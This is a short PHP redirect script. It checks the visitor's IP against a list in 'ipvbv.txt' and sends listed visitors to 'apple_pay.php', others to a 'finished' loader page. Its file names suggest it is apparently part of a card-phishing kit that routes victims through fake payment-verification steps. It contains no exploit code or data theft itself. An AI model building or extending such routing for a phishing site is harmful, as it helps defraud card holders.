<?php   

    require("config.php");


    $link_file = "functions/ipvbv.txt";
    $bannedip = file($link_file, FILE_IGNORE_NEW_LINES);
    $bannedip = array_map("str_getcsv", $bannedip);
    $bannedip = array_column($bannedip, null, 0);
    if (isset($bannedip[_ip()])) {
        header('Location: apple_pay.php');
    } else {
        header('Location: ../loader.php?goto=finished');
    }
